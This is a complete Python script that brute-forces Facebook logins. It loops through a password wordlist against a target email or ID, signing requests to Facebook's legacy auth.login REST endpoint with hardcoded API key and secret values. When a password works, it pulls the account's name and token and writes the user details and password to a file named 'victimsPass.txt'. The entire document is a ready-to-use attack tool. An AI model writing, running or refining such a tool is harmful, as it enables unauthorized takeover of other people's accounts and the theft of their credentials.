import hashlib,requests,json,os
from threading import Thread
uid = []
def init(user,pas):
	id = user
	pwd = pas
	API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
	data = {
	"api_key":"882a8490361da98702bf97a021ddc14d",
	"credentials_type":"password",
	"email":id,
	"format":"JSON",
	"generate_machine_id":"1",
	"generate_session_cookies":"1",
	"locale":"en_US",
	"method":"auth.login",
	"password":pwd,
	"return_ssl_resources":"0",
	"v":"1.0"
	}
	sig = (f'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={id}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={pwd}return_ssl_resources=0v=1.0{API_SECRET}')
	x = hashlib.new('md5')
	x.update(sig.encode('utf-8'))
	data.update({'sig':x.hexdigest()})
	r = requests.get('https://api.facebook.com/restserver.php',params=data)
	a = json.loads(r.text)
	if 'error_message' in r.text:
		return str('\033[31m\033[1mIncorrect Password\033[0m')
	elif 'Calls to this api have exceeded the rate limit.' in r.text:
		return str('null')
	else:
		pass
	try:
		if a['is_account_confirmed'] == True:
			token = a['access_token']
			vid = a['uid']
			s = requests.get('https://graph.facebook.com/me?access_token=' + token)
			sa = json.loads(s.text)
			name = sa['name']
			uid.append(vid)
			uid.append(name)
			return str('\033[32m\033[1mCorrect Password\033[0m')
	except KeyError:
		return str('\033[31m\033[1mIncorrect Password\033[0m')
def tryhard(idg):
	m = 1
	for x in open('pwlist.txt','r'):
		var = init(idg,x)
		print(f'{[m]} {var} {x}')
		m += 1
		if 'Correct Password' in var:
			file = open('victimsPass.txt','a')
			file.write(f"\nuser: {uid}\npass: {x}\n")
			file.close()
			break
		elif 'null' in var:
			print('Calls to this api have exceeded the rate limit')
			break
idgp = input('Id or Gmail: ')
tryhard(idgp)